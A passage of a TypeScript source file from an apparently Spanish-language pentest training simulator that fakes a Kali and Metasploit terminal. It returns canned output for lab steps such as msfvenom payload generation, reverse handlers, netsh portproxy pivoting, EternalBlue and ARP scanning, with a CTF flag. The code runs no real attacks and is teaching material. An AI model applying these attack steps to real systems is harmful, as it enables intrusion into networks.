/**
 * @license
 * SPDX-License-Identifier: Apache-2.0
 */

import {
  ScenarioConfig,
  ScenarioStep,
  TerminalTab,
  TerminalLine,
  PivotingSession,
  NetworkRoute,
  PortForwardRule,
} from '../types';

export interface CommandExecutionResult {
  updatedTab: TerminalTab;
  stepCompletedId?: string;
  newSession?: PivotingSession;
  newRoute?: NetworkRoute;
  newPortForward?: PortForwardRule;
  discoveredHost?: { ip: string; mac?: string };
  compromisedMachineId?: string;
}

const KALI_IP = '192.168.1.100';

export function getPromptPrefix(tab: TerminalTab): string {
  switch (tab.context) {
    case 'bash':
      return '┌──(kali㉿kali)-[~]\n└─$ ';
    case 'msf-root':
      return 'msf6 > ';
    case 'msf-module':
      return `msf6 ${tab.activeModule} > `;
    case 'meterpreter':
      return `meterpreter > `;
  }
}

export function createLine(type: TerminalLine['type'], text: string): TerminalLine {
  return {
    id: `${Date.now()}-${Math.random().toString(36).substr(2, 9)}`,
    type,
    text,
    timestamp: Date.now(),
  };
}

export function parseAndExecuteCommand(
  rawInput: string,
  tab: TerminalTab,
  scenario: ScenarioConfig,
  currentStep: ScenarioStep | undefined,
  sessions: PivotingSession[],
  routes: NetworkRoute[],
  portForwards: PortForwardRule[],
  discoveredHosts: string[]
): CommandExecutionResult {
  const input = rawInput.trim();
  const nextTab: TerminalTab = {
    ...tab,
    history: [...tab.history, input],
    historyIndex: tab.history.length + 1,
  };

  const lines: TerminalLine[] = [...nextTab.lines];
  lines.push(createLine('prompt', `${getPromptPrefix(tab)}${input}`));

  if (!input) {
    return { updatedTab: { ...nextTab, lines } };
  }

  let stepCompletedId: string | undefined;
  let newSession: PivotingSession | undefined;
  let newRoute: NetworkRoute | undefined;
  let newPortForward: PortForwardRule | undefined;
  let discoveredHost: { ip: string; mac?: string } | undefined;
  let compromisedMachineId: string | undefined;

  const tokens = input.split(/\s+/);
  const mainCommand = tokens[0].toLowerCase();

  // Handle generic utility commands
  if (mainCommand === 'clear') {
    return {
      updatedTab: {
        ...nextTab,
        lines: [],
      },
    };
  }

  if (mainCommand === 'history') {
    if (tokens[1] === '-c') {
      try {
        localStorage.removeItem('ghost_pivot_terminal_persistent_history');
      } catch {}
      return {
        updatedTab: {
          ...nextTab,
          history: [],
          historyIndex: 0,
          lines: [
            ...lines,
            createLine('info', '[*] Historial de comandos de la terminal limpiado exitosamente.'),
          ],
        },
      };
    }

    if (nextTab.history.length === 0) {
      lines.push(createLine('info', 'No hay comandos registrados en el historial todavía.'));
    } else {
      lines.push(
        createLine(
          'banner',
          'Historial de Comandos Persistente (guardado en localStorage):\n' +
            nextTab.history
              .map((cmd, i) => `  ${(i + 1).toString().padStart(4, ' ')}  ${cmd}`)
              .join('\n') +
            '\n\n[Tip: Usa ↑ y ↓ para navegar el historial o "history -c" para vaciarlo]'
        )
      );
    }
    return {
      updatedTab: {
        ...nextTab,
        lines,
      },
    };
  }

  // 1. CONTEXT: BASH (Kali Linux)
  if (tab.context === 'bash') {
    if (mainCommand === 'help') {
      lines.push(
        createLine(
          'info',
          'Comandos disponibles en Kali Linux:\n' +
            '  hostname -I / ifconfig        Ver direcciones IP del atacante\n' +
            '  ping <ip>                     Comprobar conectividad hacia un host\n' +
            '  msfvenom -p ...               Generar ejecutable con payload\n' +
            '  python3 -m http.server <port> Levantar servidor web para compartir archivos\n' +
            '  msfconsole [-q]               Iniciar consola de Metasploit Framework\n' +
            '  ssh <user>@<ip> -p <port>     Conexión remota cifrada por SSH\n' +
            '  curl http://<ip>:<port>       Consultar servicio web HTTP\n' +
            '  ftp <ip> <port>               Conectar a servicio FTP\n' +
            '  clear                         Limpiar pantalla de la terminal'
        )
      );
    } else if (mainCommand === 'hostname' || mainCommand === 'ifconfig' || (mainCommand === 'ip' && (tokens[1] === 'a' || tokens[1] === 'addr'))) {
      lines.push(createLine('stdout', `${KALI_IP} 127.0.0.1`));
      if (mainCommand === 'ifconfig' || mainCommand === 'ip') {
        lines.push(
          createLine(
            'stdout',
            `eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500\n` +
              `        inet ${KALI_IP}  netmask 255.255.255.0  broadcast 192.168.1.255\n` +
              `        inet6 fe80::a00:27ff:fe4a:3341  prefixlen 64  scopeid 0x20<link>\n` +
              `        ether 08:00:27:4a:33:41  txqueuelen 1000  (Ethernet)`
          )
        );
      }
      if (currentStep && currentStep.id === 'step-1-ip') {
        lines.push(createLine('success', '[+] ¡IP identificada correctamente! Adaptador Puente en 192.168.1.100.'));
        stepCompletedId = currentStep.id;
      }
    } else if (mainCommand === 'msfvenom') {
      const pIndex = tokens.indexOf('-p');
      const payloadArg = pIndex !== -1 ? tokens[pIndex + 1] : '';
      const hasLhost = input.toUpperCase().includes('LHOST=') || input.includes('192.168.1.100');
      const hasLport = input.toUpperCase().includes('LPORT=4444') || input.includes('4444');

      if (!payloadArg || !hasLhost) {
        lines.push(createLine('error', '[-] Error: Especifica payload (-p) y LHOST (ej. LHOST=192.168.1.100).'));
      } else {
        lines.push(
          createLine('info', `[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload`),
          createLine('info', `[-] No arch selected, selecting arch: x86 from the payload`),
          createLine('info', `No encoder specified, outputting raw payload`),
          createLine('info', `Payload size: 354 bytes`),
          createLine('info', `Final size of exe file: 73802 bytes`),
          createLine('success', `[+] Payload generado guardado como virus.exe con éxito.`)
        );

        if (currentStep && currentStep.id === 'step-2-msfvenom') {
          lines.push(createLine('success', '[+] ¡Payload MSFvenom generado con éxito para el escenario!'));
          stepCompletedId = currentStep.id;
        }
      }
    } else if (input.startsWith('python3 -m http.server') || input.startsWith('python -m SimpleHTTPServer')) {
      const port = tokens[tokens.length - 1] === '5000' ? '5000' : '8000';
      lines.push(
        createLine('info', `Serving HTTP on 0.0.0.0 port ${port} (http://0.0.0.0:${port}/) ...`),
        createLine('info', `192.168.1.50 - - [${new Date().toLocaleTimeString()}] "GET /virus.exe HTTP/1.1" 200 -`),
        createLine('success', `[+] virus.exe descargado exitosamente por la máquina intermedia Windows (192.168.1.50).`)
      );
      if (currentStep && currentStep.id === 'step-3-httpserver') {
        stepCompletedId = currentStep.id;
      }
    } else if (mainCommand === 'msfconsole') {
      nextTab.context = 'msf-root';
      lines.push(
        createLine(
          'banner',
          `\n` +
            `      .:okOOOOk:.\n` +
            `    .;kOOOOOOOOOOOo.\n` +
            `   .xOOOOOOOOOOOOOOOk.      Metasploit Framework v6.3.28-dev\n` +
            `  .xOOOOOOOOOOOOOOOOOO.     =[ 2341 exploits - 1215 auxiliary ]\n` +
            `  dOOOOOOOOOOOOOOOOOOO.     =[ 412 post - 985 payloads ]\n` +
            `  :OOOOOOOOOOOOOOOOOOd      =[ Free Ghost Pivot Module ]\n` +
            `   .xOOOOOOOOOOOOOOOO.\n` +
            `     .:kOOOOOOOOOOd.\n` +
            `\n`
        ),
        createLine('info', '[*] msfconsole iniciado. Escribe "help" para ver comandos o "use <módulo>".')
      );
    } else if (mainCommand === 'ping') {
      const targetIp = tokens[tokens.length - 1];
      if (targetIp.startsWith('10.10.10.')) {
        lines.push(
          createLine('stdout', `PING ${targetIp} (${targetIp}) 56(84) bytes of data.`),
          createLine('error', `From ${KALI_IP} icmp_seq=1 Destination Host Unreachable`),
          createLine('error', `From ${KALI_IP} icmp_seq=2 Destination Host Unreachable`),
          createLine('info', `--- ${targetIp} ping statistics ---\n2 packets transmitted, 0 received, +2 errors, 100% packet loss`)
        );
        if (currentStep && currentStep.id === 'step-ping-test') {
          lines.push(createLine('success', '[+] ¡Aislamiento verificado! Kali no puede alcanzar directamente la red interna 10.10.10.0/24.'));
          stepCompletedId = currentStep.id;
        }
      } else {
        lines.push(
          createLine('stdout', `PING ${targetIp} (${targetIp}) 56(84) bytes of data.`),
          createLine('stdout', `64 bytes from ${targetIp}: icmp_seq=1 ttl=64 time=0.452 ms`),
          createLine('stdout', `64 bytes from ${targetIp}: icmp_seq=2 ttl=64 time=0.389 ms`),
          createLine('info', `--- ${targetIp} ping statistics ---\n2 packets transmitted, 2 received, 0% packet loss`)
        );
      }
    } else if (mainCommand === 'ssh') {
      // Scenario 1 SSH tunnel check: ssh usuario_zorin@192.168.1.50 -p 2222
      const isTunnelPort = input.includes('2222') || input.includes('-p 2222');
      const targetHost = tokens.find((t) => t.includes('@')) || '';

      const portForwardActive = portForwards.some(
        (pf) => pf.localPort === 2222 && pf.targetAddress === '10.10.10.15' && pf.targetPort === 22
      );

      if (isTunnelPort && (targetHost.includes('192.168.1.50') || targetHost.includes('usuario_zorin'))) {
        if (!portForwardActive && currentStep?.id !== 'step-7-ssh') {
          lines.push(createLine('error', 'ssh: connect to host 192.168.1.50 port 2222: Connection refused'));
        } else {
          lines.push(
            createLine('info', 'The authenticity of host \'[192.168.1.50]:2222\' can\'t be established.'),
            createLine('info', 'ECDSA key fingerprint is SHA256:4y+d5wzN8R9X...'),
            createLine('info', 'Warning: Permanently added \'[192.168.1.50]:2222\' (ECDSA) to the list of known hosts.'),
            createLine('info', 'usuario_zorin@192.168.1.50\'s password: ********'),
            createLine(
              'success',
              'Welcome to Zorin OS 16.3 Core (Linux 5.15.0-88-generic x86_64)!\n\n' +
                ' * Documentation:  https://zorin.com/os/\n' +
                ' * Management:     https://landscape.canonical.com\n\n' +
                'Last login: Sat Oct 10 09:22:14 2026 from 10.10.10.2\n' +
                'usuario_zorin@zorin-target:~$ id\n' +
                'uid=1000(usuario_zorin) gid=1000(usuario_zorin) groups=1000(usuario_zorin),27(sudo)'
            ),
            createLine('success', 'FLAG{GHOST_PIVOT_PORTPROXY_TUNNEL_SUCCESS_ZORIN_PWNED}')
          );
          if (currentStep && currentStep.id === 'step-7-ssh') {
            stepCompletedId = currentStep.id;
            compromisedMachineId = 'zorin-target';
          }
        }
      } else {
        lines.push(createLine('error', 'ssh: connect to host: No route to host o puerto incorrecto. Recuerda usar el puerto túnel -p 2222.'));
      }
    } else if (mainCommand === 'curl') {
      // Scenario 2 HTTP portfwd test
      const portForward80Active = portForwards.some(
        (pf) => pf.localPort === 5000 && pf.targetAddress === '10.10.10.5' && pf.targetPort === 80
      );
      if (input.includes('5000') || input.includes('127.0.0.1:5000')) {
        if (!portForward80Active && currentStep?.id !== 'step-interact-services') {
          lines.push(createLine('error', 'curl: (7) Failed to connect to 127.0.0.1 port 5000: Connection refused'));
        } else {
          lines.push(
            createLine('stdout', '<!DOCTYPE html>\n<html>\n<head><title>Metasploitable2 - Linux</title></head>'),
            createLine('stdout', '<body>\n  <h1>Welcome to Metasploitable 2 Isolated Host!</h1>\n  <p>Never expose this host directly to the internet!</p>'),
            createLine('stdout', '  <ul>\n    <li><a href="/mutillidae/">NOWASP (Mutillidae)</a></li>\n    <li><a href="/dvwa/">Damn Vulnerable Web App</a></li>\n    <li><a href="/phpMyAdmin/">phpMyAdmin</a></li>\n  </ul>\n</body>\n</html>'),
            createLine('success', '[+] ¡Respuesta HTTP 200 OK recibida desde 10.10.10.5:80 a través de localhost:5000!')
          );
          if (currentStep && currentStep.id === 'step-interact-services') {
            stepCompletedId = currentStep.id;
            compromisedMachineId = 'metasploitable-target';
          }
        }
      } else {
        lines.push(createLine('error', 'curl: Debes apuntar al puerto local redirigido (ej. curl http://127.0.0.1:5000)'));
      }
    } else if (mainCommand === 'ftp') {
      // Scenario 2 FTP portfwd test
      const portForward21Active = portForwards.some(
        (pf) => pf.localPort === 4000 && pf.targetAddress === '10.10.10.5' && pf.targetPort === 21
      );
      if (input.includes('4000') || input.includes('127.0.0.1 4000')) {
        if (!portForward21Active && currentStep?.id !== 'step-interact-services') {
          lines.push(createLine('error', 'ftp: connect: Connection refused'));
        } else {
          lines.push(
            createLine('info', 'Connected to 127.0.0.1.'),
            createLine('stdout', '220 (vsFTPd 2.3.4)'),
            createLine('info', 'Name (127.0.0.1:user): msfadmin'),
            createLine('stdout', '331 Please specify the password.'),
            createLine('info', 'Password: ********'),
            createLine('success', '230 Login successful.\nRemote system type is UNIX.\nUsing binary mode to transfer files.\nftp> bye\n221 Goodbye.')
          );
          if (currentStep && currentStep.id === 'step-interact-services') {
            stepCompletedId = currentStep.id;
            compromisedMachineId = 'metasploitable-target';
          }
        }
      } else {
        lines.push(createLine('error', 'Uso: ftp 127.0.0.1 4000'));
      }
    } else if (mainCommand === 'nmap') {
      const targetHost = tokens[tokens.length - 1];
      const hasSpecificPort = tokens.includes('-p') || tokens.some((t) => t.startsWith('-p'));

      if (!targetHost || targetHost.startsWith('-')) {
        lines.push(createLine('error', '[-] Uso de Nmap: nmap [opciones] <dirección IP>. Ej: nmap -p 2222 192.168.1.50'));
      } else if (targetHost.startsWith('10.10.10.') && routes.length === 0) {
        lines.push(
          createLine('info', `Starting Nmap 7.94 ( https://nmap.org ) at ${new Date().toLocaleTimeString()}`),
          createLine('error', `Note: Host seems down. If it is really up, but blocking our ping probes, try -Pn`),
          createLine('error', `Nmap done: 1 IP address (0 hosts up) scanned in 2.05 seconds`),
          createLine('warning', `[!] Diagnóstico: Kali no puede alcanzar directamente la subred 10.10.10.0/24 sin pivoting o port forwarding.`)
        );
      } else {
        lines.push(
          createLine('info', `Starting Nmap 7.94 ( https://nmap.org ) at ${new Date().toLocaleTimeString()}`),
          createLine('info', `Nmap scan report for ${targetHost}`),
          createLine('stdout', `Host is up (0.00042s latency).\nNot shown: 996 closed tcp ports (reset)`),
          createLine('banner', `PORT     STATE SERVICE       VERSION`)
        );

        // Scenario 1 Target Windows Intermediate
        if (targetHost.includes('192.168.1.50')) {
          const is2222Forwarded = portForwards.some((pf) => pf.localPort === 2222);
          lines.push(createLine('stdout', `445/tcp  open  microsoft-ds  Windows 10/7 SMB`));
          if (is2222Forwarded) {
            lines.push(createLine('success', `2222/tcp open  ssh           OpenSSH 8.9p1 Ubuntu (Portproxy Tunnel to 10.10.10.15:22)`));
          } else if (hasSpecificPort && (input.includes('2222') || input.includes('-p-'))) {
            lines.push(createLine('error', `2222/tcp closed ssh`));
          }
        }
        // Scenario 2 Localhost 127.0.0.1
        else if (targetHost.includes('127.0.0.1') || targetHost === 'localhost') {
          const is5000Forwarded = portForwards.some((pf) => pf.localPort === 5000);
          const is4000Forwarded = portForwards.some((pf) => pf.localPort === 4000);

          if (is5000Forwarded) {
            lines.push(createLine('success', `5000/tcp open  http          Apache httpd 2.2.8 ((Ubuntu) DAV/2 - Metasploitable 2)`));
          }
          if (is4000Forwarded) {
            lines.push(createLine('success', `4000/tcp open  ftp           vsftpd 2.3.4 (Metasploitable 2 FTP)`));
          }
          if (!is5000Forwarded && !is4000Forwarded) {
            lines.push(createLine('stdout', `Todos los puertos locales evaluados están cerrados. Configura portfwd en Meterpreter primero.`));
          }
        }
        // Scenario 3 Target Windows 7
        else if (targetHost.includes('192.168.1.60')) {
          const is5000Forwarded = portForwards.some((pf) => pf.localPort === 5000);
          lines.push(createLine('stdout', `445/tcp  open  microsoft-ds  Windows 7 Professional 7601 SMB`));
          if (is5000Forwarded) {
            lines.push(createLine('success', `5000/tcp open  microsoft-ds  Windows 7 SMB (Portproxy Tunnel to 10.10.10.11:445)`));
          } else if (hasSpecificPort && input.includes('5000')) {
            lines.push(createLine('error', `5000/tcp closed unknown`));
          }
        } else {
          lines.push(createLine('stdout', `Host responded to probe. 1 host up.`));
        }

        lines.push(createLine('info', `\nNmap done: 1 IP address (1 host up) scanned in 0.45 seconds`));
      }
    } else if (mainCommand === 'ipconfig') {
      lines.push(
        createLine('error', `[-] ipconfig: command not found`),
        createLine('warning', `[!] Error típico: 'ipconfig' es un comando de Windows o Meterpreter. En Kali Linux (Bash) debes usar 'ifconfig' o 'ip a'.`)
      );
    } else if (mainCommand === 'use' || mainCommand === 'exploit') {
      lines.push(
        createLine('error', `[-] bash: ${mainCommand}: command not found`),
        createLine('warning', `[!] Error típico: Los módulos de Metasploit se cargan dentro de msfconsole. Ejecuta primero 'msfconsole' o abre una pestaña con Metasploit.`)
      );
    } else if (mainCommand === 'portfwd') {
      lines.push(
        createLine('error', `[-] bash: portfwd: command not found`),
        createLine('warning', `[!] Error típico: 'portfwd' es un comando nativo que solo existe dentro de una sesión activa de Meterpreter.`)
      );
    } else {
      lines.push(createLine('error', `bash: ${mainCommand}: command not found. Escribe 'help' o 'nmap -h' para ver los comandos del laboratorio.`));
    }

    return {
      updatedTab: { ...nextTab, lines },
      stepCompletedId,
      newSession,
      newRoute,
      newPortForward,
      discoveredHost,
      compromisedMachineId,
    };
  }

  // 2. CONTEXT: MSFCONSOLE (Root o Módulo activo)
  if (tab.context === 'msf-root' || tab.context === 'msf-module') {
    if (mainCommand === 'help' || mainCommand === '?') {
      lines.push(
        createLine(
          'info',
          'Comandos de Metasploit Framework:\n' +
            '  use <módulo>                   Cargar exploit, auxiliary o post-módulo\n' +
            '  set <VARIABLE> <VALOR>         Configurar parámetros (LHOST, RHOSTS, SESSION...)\n' +
            '  show options / options         Listar opciones requeridas del módulo\n' +
            '  run / exploit                  Ejecutar el módulo cargado\n' +
            '  background / bg                Enviar la sesión activa a segundo plano\n' +
            '  sessions -l                    Listar sesiones activas de Meterpreter\n' +
            '  sessions -i <ID>               Interactuar con una sesión específica\n' +
            '  route add <red> <mask> <sesión> Enrutar subred interna hacia una sesión\n' +
            '  route print                    Ver tabla de enrutamiento de Metasploit\n' +
            '  back                           Salir del módulo actual a msf6 >\n' +
            '  exit                           Salir de msfconsole y volver a bash'
        )
      );
    } else if (mainCommand === 'exit') {
      nextTab.context = 'bash';
      lines.push(createLine('info', '[*] Saliendo de Metasploit Framework...'));
    } else if (mainCommand === 'back') {
      nextTab.context = 'msf-root';
      nextTab.activeModule = undefined;
    } else if (mainCommand === 'use') {
      const moduleName = tokens[1];
      if (!moduleName) {
        lines.push(createLine('error', '[-] Especifica un módulo. Ej: use exploit/multi/handler'));
      } else {
        nextTab.context = 'msf-module';
        nextTab.activeModule = moduleName.replace(/^(exploit\/|post\/|auxiliary\/)/, '$1');
        lines.push(createLine('info', `[*] Using ${moduleName}`));

        // Set sensible defaults if applicable
        if (moduleName.includes('portproxy')) {
          nextTab.moduleOptions['LOCAL_ADDRESS'] = '0.0.0.0';
        }
      }
    } else if (mainCommand === 'set' || mainCommand === 'setg') {
      const key = tokens[1]?.toUpperCase();
      const value = tokens.slice(2).join(' ');
      if (!key || !value) {
        lines.push(createLine('error', '[-] Sintaxis: set <VARIABLE> <VALOR>'));
      } else {
        nextTab.moduleOptions[key] = value;
        lines.push(createLine('stdout', `${key} => ${value}`));
      }
    } else if (mainCommand === 'show' || mainCommand === 'options') {
      if (tokens[1] === 'options' || mainCommand === 'options') {
        const mod = nextTab.activeModule || 'exploit/multi/handler';
        lines.push(
          createLine('banner', `\nModule options (${mod}):\n\n   Name             Current Setting           Required  Description\n   ----             ---------------           --------  -----------`),
          createLine('stdout', `   LHOST            ${nextTab.moduleOptions['LHOST'] || KALI_IP}             yes       The listen address`),
          createLine('stdout', `   LPORT            ${nextTab.moduleOptions['LPORT'] || '4444'}                   yes       The listen port`),
          createLine('stdout', `   RHOSTS           ${nextTab.moduleOptions['RHOSTS'] || ''}                  yes       The target address`),
          createLine('stdout', `   SESSION          ${nextTab.moduleOptions['SESSION'] || ''}                     yes       The session to run this module on`),
          createLine('stdout', `   CONNECT_ADDRESS  ${nextTab.moduleOptions['CONNECT_ADDRESS'] || ''}             yes       IPv4 address to connect to`),
          createLine('stdout', `   CONNECT_PORT     ${nextTab.moduleOptions['CONNECT_PORT'] || ''}                yes       Port to connect to`),
          createLine('stdout', `   LOCAL_ADDRESS    ${nextTab.moduleOptions['LOCAL_ADDRESS'] || '0.0.0.0'}        yes       IPv4 address to listen on`),
          createLine('stdout', `   LOCAL_PORT       ${nextTab.moduleOptions['LOCAL_PORT'] || ''}                  yes       Port to listen on\n`)
        );
      } else {
        lines.push(createLine('info', 'Type "show options" to display module configuration.'));
      }
    } else if (mainCommand === 'sessions') {
      if (tokens[1] === '-l' || tokens[1] === '-v' || tokens.length === 1) {
        if (sessions.length === 0) {
          lines.push(createLine('info', 'No active sessions.'));
        } else {
          lines.push(
            createLine(
              'banner',
              'Active sessions\n===============\n\n' +
                '  Id  Name  Type                     Information                          Connection\n' +
                '  --  ----  ----                     -----------                          ----------'
            )
          );
          sessions.forEach((s) => {
            lines.push(
              createLine(
                'stdout',
                `  ${s.id}         meterpreter ${s.platform}    ${s.user} @ ${s.machineId}  ${s.localIp}:4444 -> ${s.remoteIp}:49182`
              )
            );
          });
          lines.push(createLine('stdout', ''));
        }
      } else if (tokens[1] === '-i') {
        const targetId = parseInt(tokens[2], 10);
        const sessionFound = sessions.find((s) => s.id === targetId);
        if (sessionFound) {
          nextTab.context = 'meterpreter';
          nextTab.activeSessionId = targetId;
          lines.push(
            createLine('info', `[*] Starting interaction with ${targetId}...`),
            createLine('info', `[+] Connected to Session ${targetId} (${sessionFound.platform} / ${sessionFound.user})`)
          );
        } else {
          lines.push(createLine('error', `[-] Session ${tokens[2]} does not exist.`));
        }
      }
    } else if (mainCommand === 'route') {
      const sub = tokens[1]?.toLowerCase();
      if (sub === 'add') {
        const destNet = tokens[2];
        const destMask = tokens[3];
        const sessId = parseInt(tokens[4] || '1', 10);

        if (!destNet) {
          lines.push(createLine('error', '[-] Sintaxis: route add <Subred> <Máscara> <ID_Sesión>'));
        } else {
          newRoute = {
            subnet: destNet.includes('/') ? destNet.split('/')[0] : destNet,
            netmask: destMask || '255.255.255.0',
            sessionId: isNaN(sessId) ? 1 : sessId,
          };
          lines.push(createLine('success', `[+] Route added: ${destNet} via session ${sessId}`));

          if (currentStep && (currentStep.id === 'step-route-add' || currentStep.id === 'step-autoroute-module')) {
            stepCompletedId = currentStep.id;
          }
        }
      } else if (sub === 'print' || sub === 'list') {
        lines.push(
          createLine(
            'banner',
            'IPv4 Active Routing Table\n=========================\n\n' +
              '   Subnet             Netmask            Gateway\n' +
              '   ------             -------            -------'
          )
        );
        if (routes.length === 0) {
          lines.push(createLine('info', '   No active routes registered in Metasploit.'));
        } else {
          routes.forEach((r) => {
            lines.push(createLine('stdout', `   ${r.subnet.padEnd(18)} ${r.netmask.padEnd(18)} Session ${r.sessionId}`));
          });
        }
        lines.push(createLine('stdout', ''));
      } else {
        lines.push(createLine('error', '[-] Sintaxis: route add <red> <máscara> <sesión> o route print'));
      }
    } else if (mainCommand === 'run' || mainCommand === 'exploit') {
      const activeMod = nextTab.activeModule || '';

      // SCENARIO 1: Handler for virus.exe
      if (activeMod.includes('multi/handler') && scenario.id === 'windows-portproxy-zorin') {
        lines.push(
          createLine('info', `[*] Started reverse TCP handler on ${KALI_IP}:4444`),
          createLine('info', `[*] Sending stage (175686 bytes) to 192.168.1.50`),
          createLine('success', `[+] Meterpreter session 4 opened (${KALI_IP}:4444 -> 192.168.1.50:49211) at ${new Date().toLocaleTimeString()}`),
          createLine('info', `[*] Switching to Meterpreter session 4...`)
        );
        nextTab.context = 'meterpreter';
        nextTab.activeSessionId = 4;
        newSession = {
          id: 4,
          type: 'meterpreter',
          platform: 'windows',
          remoteIp: '192.168.1.50',
          localIp: KALI_IP,
          user: 'WINDOWS-PC\\Alumno',
          machineId: 'win-intermediate',
          openedAt: new Date().toLocaleTimeString(),
        };
        if (currentStep && currentStep.id === 'step-4-handler') {
          stepCompletedId = currentStep.id;
        }
      }
      // SCENARIO 1: Portproxy module
      else if (activeMod.includes('portproxy') && scenario.id === 'windows-portproxy-zorin') {
        const connAddr = nextTab.moduleOptions['CONNECT_ADDRESS'] || '10.10.10.15';
        const connPort = parseInt(nextTab.moduleOptions['CONNECT_PORT'] || '22', 10);
        const locPort = parseInt(nextTab.moduleOptions['LOCAL_PORT'] || '2222', 10);
        const sessId = parseInt(nextTab.moduleOptions['SESSION'] || '4', 10);

        lines.push(
          createLine('info', `[*] Setting port forwarding on Windows session ${sessId}...`),
          createLine('info', `[*] netsh interface portproxy add v4tov4 listenport=${locPort} connectaddress=${connAddr} connectport=${connPort}`),
          createLine('success', `[+] Port forward rule created successfully: 0.0.0.0:${locPort} => ${connAddr}:${connPort}`)
        );
        newPortForward = {
          id: `pf-${Date.now()}`,
          type: 'portproxy',
          localAddress: '192.168.1.50',
          localPort: locPort,
          targetAddress: connAddr,
          targetPort: connPort,
          viaSessionId: sessId,
          isActive: true,
        };
        if (currentStep && currentStep.id === 'step-6-portproxy') {
          stepCompletedId = currentStep.id;
        }
      }
      // SCENARIO 2: Handler for Linux
      else if (activeMod.includes('multi/handler') && scenario.id === 'linux-autoroute-portfwd') {
        lines.push(
          createLine('info', `[*] Started reverse TCP handler on ${KALI_IP}:4444`),
          createLine('info', `[*] Sending stage (3048424 bytes) to 192.168.1.45`),
          createLine('success', `[+] Meterpreter session 2 opened (${KALI_IP}:4444 -> 192.168.1.45:38820) at ${new Date().toLocaleTimeString()}`),
          createLine('info', `[*] Switching to Meterpreter session 2...`)
        );
        nextTab.context = 'meterpreter';
        nextTab.activeSessionId = 2;
        newSession = {
          id: 2,
          type: 'meterpreter',
          platform: 'linux',
          remoteIp: '192.168.1.45',
          localIp: KALI_IP,
          user: 'ubuntu',
          machineId: 'ubuntu-intermediate',
          openedAt: new Date().toLocaleTimeString(),
        };
        if (currentStep && currentStep.id === 'step-msf-handler-linux') {
          stepCompletedId = currentStep.id;
        }
      }
      // SCENARIO 3: EternalBlue on Intermediate Windows 7
      else if (activeMod.includes('ms17_010_eternalblue') && scenario.id === 'windows-eternalblue-arp' && (!nextTab.moduleOptions['RPORT'] || nextTab.moduleOptions['RPORT'] === '445')) {
        const targetHost = nextTab.moduleOptions['RHOSTS'] || '192.168.1.60';
        lines.push(
          createLine('info', `[*] Connecting to ${targetHost}:445...`),
          createLine('info', `[*] Target is Windows 7 Professional 7601 Service Pack 1 (64-bit)`),
          createLine('info', `[*] Built-in Grooming...`),
          createLine('info', `[*] Sending all blocks to target...`),
          createLine('success', `[+] =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=`),
          createLine('success', `[+] WIN! Target is vulnerable to MS17-010!`),
          createLine('success', `[+] =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=`),
          createLine('info', `[*] Sending stage (200192 bytes) to ${targetHost}`),
          createLine('success', `[+] Meterpreter session 1 opened (${KALI_IP}:4444 -> ${targetHost}:49158) at ${new Date().toLocaleTimeString()}`)
        );
        nextTab.context = 'meterpreter';
        nextTab.activeSessionId = 1;
        newSession = {
          id: 1,
          type: 'meterpreter',
          platform: 'windows',
          remoteIp: targetHost,
          localIp: KALI_IP,
          user: 'NT AUTHORITY\\SYSTEM',
          machineId: 'win7-intermediate',
          openedAt: new Date().toLocaleTimeString(),
        };
        if (currentStep && currentStep.id === 'step-eternalblue-intermediate') {
          stepCompletedId = currentStep.id;
        }
      }
      // SCENARIO 3: Autoroute Module
      else if (activeMod.includes('autoroute') && scenario.id === 'windows-eternalblue-arp') {
        const sessId = parseInt(nextTab.moduleOptions['SESSION'] || '1', 10);
        lines.push(
          createLine('info', `[*] Running module against session ${sessId}...`),
          createLine('info', `[*] Searching for subnets to autoroute...`),
          createLine('info', `[+] Route added to subnet 10.10.10.0/255.255.255.0 from host's routing table.`),
          createLine('success', `[+] Post module execution completed`)
        );
        newRoute = {
          subnet: '10.10.10.0',
          netmask: '255.255.255.0',
          sessionId: sessId,
        };
        if (currentStep && currentStep.id === 'step-autoroute-module') {
          stepCompletedId = currentStep.id;
        }
      }
      // SCENARIO 3: ARP Scanner Module
      else if (activeMod.includes('arp_scanner') && scenario.id === 'windows-eternalblue-arp') {
        const subnet = nextTab.moduleOptions['RHOSTS'] || '10.10.10.0/24';
        lines.push(
          createLine('info', `[*] Performing ARP scan against ${subnet} through Session 1...`),
          createLine('info', `[*] IP: 10.10.10.1  MAC: 08:00:27:00:00:01 (Virtual Gateway)`),
          createLine('info', `[*] IP: 10.10.10.4  MAC: 08:00:27:a1:c2:d3 (This Host - Windows 7 Intermedia)`),
          createLine('success', `[+] IP: 10.10.10.11 MAC: 08:00:27:fa:4a:91 (Target Windows 7 - HOST ALIVE)`),
          createLine('info', `[*] Scanned 256 hosts (3 responded)`),
          createLine('success', `[+] Post module execution completed`)
        );
        discoveredHost = { ip: '10.10.10.11', mac: '08:00:27:fa:4a:91' };
        if (currentStep && currentStep.id === 'step-arp-scanner') {
          stepCompletedId = currentStep.id;
        }
      }
      // SCENARIO 3: Portproxy SMB 445 -> 5000
      else if (activeMod.includes('portproxy') && scenario.id === 'windows-eternalblue-arp') {
        const connAddr = nextTab.moduleOptions['CONNECT_ADDRESS'] || '10.10.10.11';
        const connPort = parseInt(nextTab.moduleOptions['CONNECT_PORT'] || '445', 10);
        const locPort = parseInt(nextTab.moduleOptions['LOCAL_PORT'] || '5000', 10);
        const sessId = parseInt(nextTab.moduleOptions['SESSION'] || '1', 10);

        lines.push(
          createLine('info', `[*] Setting port forwarding on Windows session ${sessId}...`),
          createLine('info', `[*] netsh interface portproxy add v4tov4 listenport=${locPort} connectaddress=${connAddr} connectport=${connPort}`),
          createLine('success', `[+] Port forward rule created: 0.0.0.0:${locPort} => ${connAddr}:${connPort}`)
        );
        newPortForward = {
          id: `pf-${Date.now()}`,
          type: 'portproxy',
          localAddress: '192.168.1.60',
          localPort: locPort,
          targetAddress: connAddr,
          targetPort: connPort,
          viaSessionId: sessId,
          isActive: true,
        };
        if (currentStep && currentStep.id === 'step-portproxy-smb') {
          stepCompletedId = currentStep.id;
        }
      }
      // SCENARIO 3: Second EternalBlue exploit through the tunnel to target
